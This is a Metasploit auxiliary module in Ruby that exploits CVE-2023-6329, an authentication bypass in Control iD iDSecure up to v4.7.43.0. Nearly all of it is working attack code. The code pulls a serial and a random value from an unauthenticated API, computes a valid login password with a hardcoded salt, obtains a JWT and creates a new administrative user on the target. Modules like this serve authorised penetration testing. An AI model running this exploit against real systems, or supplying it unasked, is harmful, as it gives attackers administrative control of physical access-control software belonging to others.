class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Control iD iDSecure Authentication Bypass (CVE-2023-6329)',
        'Description' => %q{
          This module exploits an improper access control vulnerability (CVE-2023-6329) in Control iD iDSecure <= v4.7.43.0. It allows an
          unauthenticated remote attacker to compute valid credentials and to add a new administrative user to the web interface of the product.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Tenable' # Discovery and PoC
        ],
        'References' => [
          ['CVE', '2023-6329'],
          ['URL', 'https://www.tenable.com/security/research/tra-2023-36']
        ],
        'DisclosureDate' => '2023-11-27',
        'DefaultOptions' => {
          'RPORT' => 30443,
          'SSL' => true
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('NEW_USER', [true, 'The new administrative user to add to the system', Rex::Text.rand_text_alphanumeric(8)]),
      OptString.new('NEW_PASSWORD', [true, 'Password for the specified user', Rex::Text.rand_text_alphanumeric(12)])
    ])
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'api/util/configUI')
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return CheckCode::Unknown
    end

    return CheckCode::Unknown unless res&.code == 401

    data = res.get_json_document
    version = data['Version']
    return CheckCode::Unknown if version.nil?

    print_status('Got version: ' + version)
    return CheckCode::Safe unless Rex::Version.new(version) <= Rex::Version.new('4.7.43.0')

    return CheckCode::Appears
  end

  def run
    # 1) Obtain the serial and passwordRandom
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/login/unlockGetData')
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, res.to_s)
    end

    json = res.get_json_document
    unless json.key?('passwordRandom') && json.key?('serial')
      fail_with(Failure::UnexpectedReply, 'Unable to retrieve passwordRandom and serial')
    end

    password_random = json['passwordRandom']
    serial = json['serial']
    print_good('Retrieved passwordRandom: ' + password_random)
    print_good('Retrieved serial: ' + serial)

    # 2) Create passwordCustom
    sha1_hash = Digest::SHA1.hexdigest(serial)
    combined_string = sha1_hash + password_random + 'cid2016'
    sha256_hash = Digest::SHA256.hexdigest(combined_string)
    short_hash = sha256_hash[0, 6]
    password_custom = short_hash.to_i(16).to_s
    print_status("Created passwordCustom: #{password_custom}")

    # 3) Login with passwordCustom and passwordRandom to obtain a JWT
    body = "{\"passwordCustom\": \"#{password_custom}\", \"passwordRandom\": \"#{password_random}\"}"

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api/login/'),
      'data' => body
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, res.to_s)
    end

    json = res.get_json_document
    unless json.key?('accessToken')
      fail_with(Failure::UnexpectedReply, 'Did not receive JWT')
    end

    access_token = json['accessToken']
    print_good('Retrieved JWT: ' + access_token)

    # 4) Add a new administrative user
    body = {
      idType: '1',
      name: datastore['NEW_USER'],
      user: datastore['NEW_USER'],
      newPassword: datastore['NEW_PASSWORD'],
      password_confirmation: datastore['NEW_PASSWORD']
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'Authorization' => "Bearer #{access_token}"
      },
      'uri' => normalize_uri(target_uri.path, 'api/operator/'),
      'data' => body
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, res.to_s)
    end

    json = res.get_json_document
    unless json.key?('code') && json['code'] == 200 && json.key?('error') && json['error'] == 'OK'
      fail_with(Failure::UnexpectedReply, 'Received unexpected value for code and/or error:\n' + json.to_s)
    end

    # 5) Confirm credentials work
    body = {
      username: datastore['NEW_USER'],
      password: datastore['NEW_PASSWORD'],
      passwordCustom: nil
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api/login/'),
      'data' => body
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, res.to_s)
    end

    json = res.get_json_document
    unless json.key?('accessToken') && json.key?('unlock')
      fail_with(Failure::UnexpectedReply, 'Received unexpected reply:\n' + json.to_s)
    end

    store_valid_credential(user: datastore['NEW_USER'], private: datastore['NEW_PASSWORD'], proof: json.to_s)
    print_good("New user '#{datastore['NEW_USER']}:#{datastore['NEW_PASSWORD']}' was successfully added.")
    print_good("Login at: #{full_uri(normalize_uri(target_uri, '#/login'))}")
  end
end
